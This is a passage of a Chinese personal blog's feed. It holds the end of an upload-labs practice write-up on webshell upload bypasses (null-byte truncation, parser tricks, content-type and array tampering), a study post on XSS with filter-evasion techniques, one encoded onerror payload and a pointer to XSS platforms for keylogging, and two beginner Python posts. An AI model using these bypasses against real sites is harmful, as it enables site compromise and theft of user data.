src="http://120.48.107.243:9090/blog/2023/04/03/0eea40171359438f81ff473b56d04ce2-20230403142205201.png" alt="在这里插入图片描述"><br>##3、在sh.php后面加上.7z<br><img src="http://120.48.107.243:9090/blog/2023/04/03/caba414623834725a903880ee4dd751a.png" alt="在这里插入图片描述"><br>##4、写好一个py文件<br><img src="http://120.48.107.243:9090/blog/2023/04/03/df33745c6eaa439790c741aa2a31dd08.png" alt="在这里插入图片描述"><br>##5、burp攻击（方式和上关一样）+py请求。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/18009b3be0c04f199bdf4323109832cf.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/00af31df955f4307945d0ab5cf3c2bda.png" alt="在这里插入图片描述"><br>成功拿到shell。</p><h2 id="6、利用shell"><a href="#6、利用shell" class="headerlink" title="6、利用shell"></a>6、利用shell</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e170360d153c45309ba846b63ac69833.png" alt="在这里插入图片描述"><br>##7、第二种绕过方法：文件包含+图片马<br>抓到包后将sh.php改为sh.jpg，一句话木马前加上GIF89a，上传成功后，使用前几关的文件包含漏洞包含即可成功。</p><h1 id="二十一、Pass-20"><a href="#二十一、Pass-20" class="headerlink" title="二十一、Pass-20"></a>二十一、Pass-20</h1><h2 id="1、第一种方法：上传文件，文件名用-00截断，抓包解码"><a href="#1、第一种方法：上传文件，文件名用-00截断，抓包解码" class="headerlink" title="1、第一种方法：上传文件，文件名用%00截断，抓包解码"></a>1、第一种方法：上传文件，文件名用%00截断，抓包解码</h2><p>例如shell.php%00.jpg截断后shell.php或者使用&#x2F;.<br><img src="http://120.48.107.243:9090/blog/2023/04/03/91761d8d545b46f2bf17d80ac8ebf243.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/519b0afc3eb541f99e36a5361386788f.png" alt="在这里插入图片描述"></p><p>&#x3D;&#x3D;注意：%00截断需要gpc关闭，抓包，解码，提交即可，截断文件名php版本小于5.3.4才行。&#x3D;&#x3D;<br>##2、第二种方法：配合中间件解析漏洞使用<br>例如 iis6.0 上传 1.php;1.jpg ， apache 上传 1.php.a 也能解析文件 a.asp;1.jpg 解析成 asp<br><img src="http://120.48.107.243:9090/blog/2023/04/03/22939e44e5c5421994ca188226cbb74e.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/ac0e5c6fd8264302a63fa00e12235ee0.png" alt="在这里插入图片描述"></p><h1 id="二十二、Pass-21"><a href="#二十二、Pass-21" class="headerlink" title="二十二、Pass-21"></a>二十二、Pass-21</h1><p>第二关的方法同样适用，但需要前面关卡的文件包含漏洞。<br>##1、选择sh.php，开启抓包，提交，抓到包<br>需要用Burp2020版。<br>##2、将Content-Type字段改为image&#x2F;jpeg（允许的三个都可以）并将数据包中的name&#x3D;”save_name”以数组的形式发送，并将数组的最后一位改成可被成功放行的（jpg,png,gif）中的任意一种。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b6567d383b734d3eb41212f063fe2421.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/20c9e286d6e74ccfb78e689328bccfd1.png" alt="在这里插入图片描述"></p><h2 id="3、放包，成功上传。"><a href="#3、放包，成功上传。" class="headerlink" title="3、放包，成功上传。"></a>3、放包，成功上传。</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f02532d9b33f497086b7c8580cfebf78.png" alt="在这里插入图片描述"></p><h2 id="4、即可发现成功。"><a href="#4、即可发现成功。" class="headerlink" title="4、即可发现成功。"></a>4、即可发现成功。</h2><p>在文件包含漏洞页面，使用file访问即可。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> upload-labs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> upload-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞的学习</title>
      <link href="/2022/03/25/xss_study/"/>
      <url>/2022/03/25/xss_study/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h1><p>xss攻击全称跨站脚本攻击，是为了不和层叠样式表(CSS)混淆，所以缩写成XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到web网站里面，供给其他用户访问，当用户访问到有恶意代码的网页就会产生xss攻击。<br>#二、漏洞危害</p><ol><li>盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其他网站发起攻击</li></ol><h1 id="三、漏洞防御"><a href="#三、漏洞防御" class="headerlink" title="三、漏洞防御"></a>三、漏洞防御</h1><p>xss防御的总体思路是：对于输入（和URL参数）进行过滤，对输出进行编码，也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容，然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。<br>#四、漏洞类型<br>##1、反射型<br>反射型的XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码，反射型XSS攻击的方法，攻击者通过发送邮件或诱导等方法，将包含xss恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有xss恶意脚本发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss攻击。<br>&#x3D;&#x3D;代码分析&#x3D;&#x3D;<br>在反射型xss代码中，首先判断$_GET[‘mssage’] 是否等于 kobe，如果不是则在页面中<br>将 $_GET[‘mssage’] 复制给$html 变量中,⽽且没有任何过滤再输出到⻚⾯中，所以直接输<br>⼊⻚⾯会直接输出 xss 信息，就会造成 xss 攻击。<br>##2、存储型<br>存储型XSS，持久化，代码是存储在服务器中的数据库里，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问该页面的时候，没有进行编码过滤输出到浏览器上，就会触发代码执行，造成xss攻击。<br>&#x3D;&#x3D;代码分析&#x3D;&#x3D;<br>在存储型xss代码分析中，看到留言的inster into语句中，直接插入留言信息，没有任何过滤，输入恶意代码，这个代码将记录在数据中。<br>##3、DOM型<br>DOM，全称 Document Object Model，是⼀个平台和语⾔都中⽴的接⼝，可以使程序和脚<br>本能够动态访问和更新⽂档的内容、结构以及样式。 DOM 型 XSS 其实是⼀种特殊类型的反射<br>型 XSS，它是基于 DOM ⽂档对象模型的⼀种漏洞。 在⽹站⻚⾯中有许多⻚⾯的元素，当⻚⾯<br>到达浏览器时浏览器会为⻚⾯创建⼀个顶级的 Document object ⽂档对象，接着⽣成各个⼦⽂<br>档对象，每个⻚⾯元素对应⼀个⽂档对象，每个⽂档对象包含属性、⽅法和事件。可以通过<br>JS 脚本对⽂档对象进⾏编辑从⽽修改⻚⾯的元素。也就是说，客户端的脚本程序可以通过<br>DOM 来动态修改⻚⾯内容，从客户端获取 DOM 中的数据并在本地执⾏。基于这个特性，就<br>可以利⽤ JS 脚本来实现 XSS 漏洞的利⽤；<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4c977484eb414cc98d5e49998a73caa5.png" alt="在这里插入图片描述"><br>代码分析<br>DOM型xss程序中，只有html代码，dom通过操作HTML或者css实现HTML属性、方法、事件，因此程序中没有与服务器进行交互。<br>点击按钮时，会调用domxss（）函数，跟踪domxss函数：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/281432296c0943c9bccd078608dd7641.png" alt="在这里插入图片描述"></p><h1 id="五、payload"><a href="#五、payload" class="headerlink" title="五、payload"></a>五、payload</h1><p>在网站是否存在xss漏洞时，应该输入一些标签&lt;&gt;输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在xss漏洞。<br>##1、常用的测试语句<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1cade9e6e36d404a9d9ff9e6c519975f.png" alt="在这里插入图片描述"><br>##2、一些常见标签<br>下面的标签大部分都是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望自动触发而不是等用户去触发。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/72eea0838ee04a8b8f6ae9e387fa3c85.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f42610871f264a6bbadcdbaea8174cdc.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/b792667788ef445f84db0f8811f2712c.png" alt="在这里插入图片描述"><img src="http://120.48.107.243:9090/blog/2023/04/03/3c5b789f4e06449f96edb351ba77f9a5.png" alt="在这里插入图片描述"></p><h2 id="3、javascriot伪协议"><a href="#3、javascriot伪协议" class="headerlink" title="3、javascriot伪协议"></a>3、javascriot伪协议</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f5f5cbde93ee46989f150ac8e6bb97bc.png" alt="在这里插入图片描述"><br>##4、payload<br>备忘录：<br><a href="https://netsec.expert/posts/xss-in-2021/">https://netsec.expert/posts/xss-in-2021/</a><br> <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyg">https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyg</a><br>lot<br> <a href="https://d3adend.org/xss/ghettoBypass">https://d3adend.org/xss/ghettoBypass</a><br> <a href="https://www.jb51.net/tools/xss.htm">https://www.jb51.net/tools/xss.htm</a><br> <a href="https://www.yuque.com/docs/share/c16d3bb5-929c-4239-bab9-35e2a93d7fd9">https://www.yuque.com/docs/share/c16d3bb5-929c-4239-bab9-35e2a93d7fd9</a>?<br>##5、不同位置的XSS利用方式<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2213d0bd87ea40ea8572d41cf29f59f3-20230403141323183.png" alt="在这里插入图片描述"><br>##6、远程加载payload<br><img src="http://120.48.107.243:9090/blog/2023/04/03/da4f93a8548d490ebdabb125faaa430f.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/8706f84ca3204b2cb6bb58b2f008645b.png" alt="在这里插入图片描述"></p><h2 id="7、有过滤的情况下"><a href="#7、有过滤的情况下" class="headerlink" title="7、有过滤的情况下"></a>7、有过滤的情况下</h2><h3 id="（1）过滤空格"><a href="#（1）过滤空格" class="headerlink" title="（1）过滤空格"></a>（1）过滤空格</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c40548af63494074957db7a7365d04ae.png" alt="在这里插入图片描述"><br>###（2）过滤关键字<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7762c7f52dd84556b3994dfc28e07333.png" alt="在这里插入图片描述"><br>###（3）双写关键字<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4a6b9642ea4d430cb3132ee30775fabb.png" alt="在这里插入图片描述"><br>###（4）字符拼接<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e00fd1acb65c47e78468e7f1af280d25.png" alt="在这里插入图片描述"><br>###（5）其他字符混淆<br><img src="http://120.48.107.243:9090/blog/2023/04/03/234e2f55bff24ce6af6dd44e253ed381.png" alt="在这里插入图片描述"><br>###（6）编码绕过<br>Unicode编码绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4fd3d7656e94415cb77b1406383cfa29.png" alt="在这里插入图片描述"><br>url编码绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f94095d379574930a7d0a3e2464123ef.png" alt="在这里插入图片描述"><br>Ascii码绕过<br>    <img src="x"    onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"><br>hex绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f7fd33b1506049688e10d403c02202b7.png" alt="在这里插入图片描述"><br>八进制<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ac08170db16d4d60813692d8910bf76c.png" alt="在这里插入图片描述"><br>base64绕过<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7f3336ee4d3348789bcae8b6f33df7ec.png" alt="在这里插入图片描述"></p><h3 id="（7）过滤双引号，单引号"><a href="#（7）过滤双引号，单引号" class="headerlink" title="（7）过滤双引号，单引号"></a>（7）过滤双引号，单引号</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/272fde8864384e1a8c1965bee0786bc4.png" alt="在这里插入图片描述"><br>###（8）过滤括号<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6b1b2978dc924e5386a2485152fbd2c6.png" alt="在这里插入图片描述"><br>###（9）过滤url地址<br><img src="http://120.48.107.243:9090/blog/2023/04/03/52a55eb016c44661a80889a0c19bd4d3.png" alt="在这里插入图片描述"><br>###（10）使用IP<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d0c1f1e0cde94455886936236e4dda99.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/35ae3a9445064a598439fb57e24c4f01.png" alt="在这里插入图片描述"></p><h1 id="六、XSS平台利用"><a href="#六、XSS平台利用" class="headerlink" title="六、XSS平台利用"></a>六、XSS平台利用</h1><p>在初步探测到xss漏洞时，此时我们可以使用xss在线平台，去获取一些我们需要的信息，比如位置、键盘记录、IP、表单挟持。<br>不建议自己搭建。<br>使用公网的（自行搜索）。</p><h1 id="七、漏洞修复"><a href="#七、漏洞修复" class="headerlink" title="七、漏洞修复"></a>七、漏洞修复</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1a4525d273c0422aabf80e2427c0a324.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> XSS漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> XSS漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（五）</title>
      <link href="/2022/03/18/python_five/"/>
      <url>/2022/03/18/python_five/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135902085.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python用户交互知识。&#x3D;&#x3D;</p><h1 id="一、用户交互"><a href="#一、用户交互" class="headerlink" title="一、用户交互"></a>一、用户交互</h1><h2 id="1、Python3中的用户交互"><a href="#1、Python3中的用户交互" class="headerlink" title="1、Python3中的用户交互"></a>1、Python3中的用户交互</h2><p>这里站在程序员与计算机之间的交互，本质上就是你向计算机输入内容，计算机输出内容，反馈给你。<br>###（1）接收用户的输入<br>通过input方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的大名:&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="（2）容易掉的坑"><a href="#（2）容易掉的坑" class="headerlink" title="（2）容易掉的坑"></a>（2）容易掉的坑</h3><p>&#x3D;&#x3D;注意：在Python3中，无论用户输入什么input都会把它放到一对引号中，就是把原数据类型，转换成了字符串类型，所以如果输入的int类型，想要进行四则运算，那么就要直接手动进行一下类型转换。&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">input</span>(<span class="string">&#x27;请输入数字&#x27;</span>)</span><br><span class="line">x = <span class="built_in">int</span>(x)</span><br><span class="line"><span class="built_in">print</span>(x + <span class="number">10</span>)</span><br></pre></td></tr></table></figure><h2 id="2、Python2中的用户交互"><a href="#2、Python2中的用户交互" class="headerlink" title="2、Python2中的用户交互"></a>2、Python2中的用户交互</h2><h3 id="（1）raw-input"><a href="#（1）raw-input" class="headerlink" title="（1）raw_input"></a>（1）raw_input</h3><p>Python2中&#x3D;&#x3D;raw_input（）&#x3D;&#x3D;等同于Python3中的input，都是会把用户输入的内容转化成字符串类型。<br>###（2）input（）<br>Python2中的input（），不会自动更改用户输入内容的数据类型，你输入什么类型，就返回什么类型的内容，虽热我们作为开发用Python2中input（）很方便，但是对用户不是友好的，因为如果要使用就必须先了解Python的基础数据类型，所以在Python发展中舍弃了这种用户交互。<br>#二、格式化输出<br>输入是input，输出就是output，在Python中输出用Print体现出来。<br>##1、什么是格式化输出<br>就是字面意思，按照一定的格式输出内容，如：输出班级中每个学生的姓名和年龄。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">姓名:xxx,年龄:xxx</span><br></pre></td></tr></table></figure><p>这个时候我们就可以把格式理解成模版，只需要替换里面的关键内容即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名:张三,年龄:<span class="number">18</span></span><br><span class="line">姓名:张四,年龄:<span class="number">19</span></span><br><span class="line">姓名:张五,年龄:<span class="number">20</span></span><br><span class="line">姓名:张六,年龄:<span class="number">21</span></span><br><span class="line">姓名:张七,年龄:<span class="number">22</span></span><br></pre></td></tr></table></figure><h2 id="2、格式化输出的三种方式"><a href="#2、格式化输出的三种方式" class="headerlink" title="2、格式化输出的三种方式"></a>2、格式化输出的三种方式</h2><h3 id="（1）-格式化"><a href="#（1）-格式化" class="headerlink" title="（1）%格式化"></a>（1）%格式化</h3><p>%格式化是自从Python诞生以来就有的一种格式化方法，意思就是说Python2可以用这种方法，Python3也可以。<br>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># %s 可以接收任意类型</span></span><br><span class="line">name = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line"></span><br><span class="line">info = <span class="string">&#x27;大家好我叫%s&#x27;</span> % name</span><br><span class="line"><span class="built_in">print</span>(info) <span class="comment"># 大家好我叫alex</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %d 只能接收int类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的年龄是%d&#x27;</span> % <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># %f 只能接收float类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的体重是%fkg&#x27;</span> % <span class="number">55.7</span>)</span><br></pre></td></tr></table></figure><h3 id="（2）format-格式化"><a href="#（2）format-格式化" class="headerlink" title="（2）format()格式化"></a>（2）format()格式化</h3><p>format（）是在Python2.6后出现的一种方法，我们做格式化，本质上是字符串的格式化，format（）是字符串的一种内置方法，是Python解释器提供好的<br>使用：<br>1、一般情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;&#125;,今年&#123;&#125;岁&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>) <span class="comment">#通过位置一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>2、通过索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;1&#125;,今年&#123;0&#125;岁&#x27;</span>.<span class="built_in">format</span>(<span class="number">18</span>,<span class="string">&#x27;tom&#x27;</span>) <span class="comment">#通过索引一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>3、通过key&#x3D;value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;name&#125;,今年&#123;age&#125;岁&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;tom&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#通过key=value一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="（3）f格式化"><a href="#（3）f格式化" class="headerlink" title="（3）f格式化"></a>（3）f格式化</h3><p>f格式化是Python3.5以后才出现的一种更优雅的Python格式化方式<br>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输入名字:&#x27;</span>)</span><br><span class="line">age = <span class="built_in">input</span>(<span class="string">&#x27;请输入年龄:&#x27;</span>)</span><br><span class="line">res = <span class="string">f&#x27;你的名字是<span class="subst">&#123;name&#125;</span>,年龄是<span class="subst">&#123;age&#125;</span>岁&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="3、三种格式化之间的速度"><a href="#3、三种格式化之间的速度" class="headerlink" title="3、三种格式化之间的速度"></a>3、三种格式化之间的速度</h2><ul><li>最快: f 格式化</li><li>其次: format( ) 格式化  [ 推荐这种方法 ]</li><li>最慢: % 格式化</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（四）</title>
      <link href="/2022/03/03/python_four/"/>
      <url>/2022/03/03/python_four/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135912455.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python基础数据类型知识。&#x3D;&#x3D;</p><h1 id="一、数字类型"><a href="#一、数字类型" class="headerlink" title="一、数字类型"></a>一、数字类型</h1><p>Python中没有数字类型这一说，知识为了更好的学习，人为的把整型和浮点型统称为数字类型。<br>##1、int整型<br>###（1）作用<br>用来记录用整数记录的状态，比如年份，年龄等。<br>###（2）定义<br>age &#x3D; 20<br>year&#x3D;1999<br>##2、float浮点型<br>###（1）作用<br>用来记录用小数记录的状态，比如某些商品的价格，存款等<br>###（2）定义<br>price&#x3D;98.88<br>money&#x3D;3999.54<br>##3、数字类型的使用<br>###（1）数学运算<br>a&#x3D;99<br>b&#x3D;1<br>c&#x3D;a+b</p><p>print（c）<br>###（2）比较大小<br>x&#x3D;100<br>y&#x3D;200<br>print（y&gt;x）<br>#二、字符串类型<br>##1、字符<br>###（1）什么是字符串<br>字符串就是由许多字符组成的一串内容<br>###（2）作用<br>字符串的作用是用来记录描述性质的状态<br>###（3）定义字符串<br>用英文引号（单引号、双引号、三引号）包含的一串字符<br><img src="https://img-blog.csdnimg.cn/5782f64d9ffc4c53b2220f7d040c36a3.png" alt="在这里插入图片描述"><br>###（4）字符串的嵌套<br>注意: 字符串的嵌套只能发生在不同中引号之间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">&quot;你好,我叫&#x27;山鸡&#x27;, 你也可以叫我小鸡 , 初次见面,多多关照&quot;</span> <span class="comment"># 双引号嵌套单引号</span></span><br></pre></td></tr></table></figure><p>字符串也可以<code>用+号连接</code>,但是不称之为是字符串相加 , 称它是字符串的拼接,只限于字符串和字符串 (效率低)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello &#x27;</span></span><br><span class="line">y = <span class="string">&#x27;word&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x + y) <span class="comment"># hello word</span></span><br></pre></td></tr></table></figure><p>字符串也可以和int类型用<code>*</code>号连接, 代表复制字符串int份</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;alex sb&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s*<span class="number">3</span>) <span class="comment"># &#x27;alex sbalex sbalex sb&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="三、-列表类型"><a href="#三、-列表类型" class="headerlink" title="三、 列表类型"></a>三、 列表类型</h1><h2 id="1、-什么是列表"><a href="#1、-什么是列表" class="headerlink" title="1、 什么是列表"></a>1、 什么是列表</h2><p>你可以把列表理解成一种容器 , 容器里面可以放很多值. 有人可能会说, 我字符串也可以放很多值啊, 为什么还要用列表呢? 我们都知道他们两个都可以存放很多值, 但是我们要知道, 值不单单只有存, 还要有取, 换句话来说, 你存值就肯定会取值, 如果你不取, 那存值将毫无意义. 列表相对于字符串的优点就是取值方便, 更利于我们操作.</p><p>列表是通过索引对应值, 索引从0开始, 0代表第一个.</p><h2 id="2、-作用"><a href="#2、-作用" class="headerlink" title="2、 作用"></a>2、 作用</h2><p>记录多个值 , 并且可以按照索引取到指定位置的值</p><h2 id="3、-定义"><a href="#3、-定义" class="headerlink" title="3、 定义"></a>3、 定义</h2><p>在 [ ] 内用逗号分隔开多个任意类型的值 , 每一个值称之为一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span> ]</span><br><span class="line">索引:     <span class="number">0</span>    <span class="number">1</span>    <span class="number">2</span></span><br></pre></td></tr></table></figure><p>列表也可以嵌套列表,称之为二维列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [ [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>] , [<span class="string">&#x27;Tom&#x27;</span>, <span class="number">18</span>,<span class="string">&#x27;抽烟&#x27;</span>]]</span><br><span class="line">索引             <span class="number">0</span>                  <span class="number">1</span>                     <span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>提一嘴:</strong></p><p>列表在内存中的存储方式（基本上容器类型的数据都是这样在内存中存储的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;Tom&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;烫头&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:<span class="string">&quot;Tom&quot;</span>的内存地址</span><br><span class="line"><span class="number">1</span>:<span class="number">18</span>的内存地址</span><br><span class="line"><span class="number">2</span>:<span class="string">&#x27;烫头&#x27;</span>的内存地址</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/535179f87de8aac90c8a23637581599c.png" alt="image-20200812180634069"></p><h1 id="四、-字典类型"><a href="#四、-字典类型" class="headerlink" title="四、 字典类型"></a>四、 字典类型</h1><h2 id="1、-什么是字典"><a href="#1、-什么是字典" class="headerlink" title="1、 什么是字典"></a>1、 什么是字典</h2><p>key对应值, 其中key通常为字符串类型, 所以key对值有描述性的功能</p><p>字典是无序的, 虽然你在pycharm中打印的结果虽然每次都一样, 在python中交互式中写代码也是,但是我们仍然把字典看成无序的,或者你这样理解,有序就有索引,就可以通过索引取值,但是字典不能通过索引取值,所以是无序的.</p><h2 id="2、-作用-1"><a href="#2、-作用-1" class="headerlink" title="2、 作用"></a>2、 作用</h2><p>用来存多个值, 每一个值都有一个唯一的key与其对应</p><h2 id="3、-定义-1"><a href="#3、-定义-1" class="headerlink" title="3、 定义"></a>3、 定义</h2><p>在 { } 内用逗号分隔开多个 key :  value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;alex&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="五、-布尔类型"><a href="#五、-布尔类型" class="headerlink" title="五、 布尔类型"></a>五、 布尔类型</h1><h2 id="1、-作用"><a href="#1、-作用" class="headerlink" title="1、 作用"></a>1、 作用</h2><p>用来记录真假的状态, 通常用来当做判断的条件</p><h2 id="2、-定义"><a href="#2、-定义" class="headerlink" title="2、 定义"></a>2、 定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_ok = <span class="literal">True</span>  <span class="comment">#真</span></span><br><span class="line">is_ok = <span class="literal">False</span> <span class="comment">#假</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
